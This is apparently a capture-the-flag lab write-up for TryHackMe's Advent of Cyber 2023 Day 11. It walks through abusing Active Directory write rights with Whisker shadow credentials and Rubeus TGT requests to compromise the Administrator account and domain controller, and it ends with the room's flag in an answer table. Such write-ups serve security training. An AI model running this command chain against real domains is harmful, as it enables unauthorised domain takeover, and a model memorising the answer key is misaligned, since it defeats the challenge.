# Advent of Cyber 2023 - Day 11: Active Directory

{% embed url="https://tryhackme.com/room/adventofcyber2023" %}

## Background
Active Directory security, Access Control Lists (ACLs), and abusing `GenericWrite` / `GenericAll` over user objects using **Shadow Credentials** (`Whisker`).

## Walkthrough
1. Use BloodHound or PowerView to enumerate domain privileges:
   ```powershell
   Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -eq 'Guest'}
   ```
2. The current user has `WriteProperty` over the target admin account (`msDS-KeyCredentialLink`).
3. Deploy `Whisker` to generate a certificate and inject shadow credentials:
   ```cmd
   Whisker.exe add /target:Administrator /domain:antarcticrafts.thm
   ```
4. Request a Kerberos Ticket-Granting Ticket (TGT) using `Rubeus`:
   ```cmd
   Rubeus.exe asktgt /user:Administrator /certificate:<CERT_BASE64> /password:<PASS> /nowrap
   ```
5. Pass-the-Ticket to compromise the Domain Controller.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| AD attribute used for Shadow Credentials? | `msDS-KeyCredentialLink` |
| AD domain compromise flag | `THM{SHADOW_CREDENTIALS_DOMINANCE}` |
